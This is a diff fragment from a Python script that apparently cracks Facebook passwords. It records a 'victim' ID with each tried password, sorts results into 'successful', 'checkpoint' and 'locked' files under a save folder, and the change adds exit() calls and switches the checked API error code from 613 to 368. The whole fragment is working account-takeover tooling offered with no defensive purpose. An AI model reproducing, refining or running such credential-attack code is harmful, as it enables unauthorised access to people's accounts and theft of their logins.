@@ -146,17 +146,19 @@ def Noob():
         okb = open('save/Noob_Successful.txt', 'a')
         okb.write(victim +" [ NOOB ] "+ line + '\n')
         okb.close()
-                  
+        exit()        
       elif 'www.facebook.com' in q['error_msg']:
         motion( ycl+'[NOOB_CP] ' +victim+'  |  '+ycl + line+"\n")
         cps = open('save/Noob_CheckPoint.txt', 'a')
         cps.write(victim +" [ NOOB ] "+ line + '\n')
         cps.close()
-      elif q['error_code']  == "613" or q['error_code']  == 613:
+        exit()
+      elif q['error_code']  == "368" or q['error_code']  == 368:
         motion('\n[ LOCKED ] ' +victim+'  |  ' + line+"\n")
         okb = open('save/Noob_Successful.txt', 'a')
         okb.write(victim +" [ NOOB ] "+ line + '\n')
         okb.close()
+        exit()
       else:
         print( ycl+'[ PASSWORD WRONG ] '  +ycl + line+'\n')
     except:
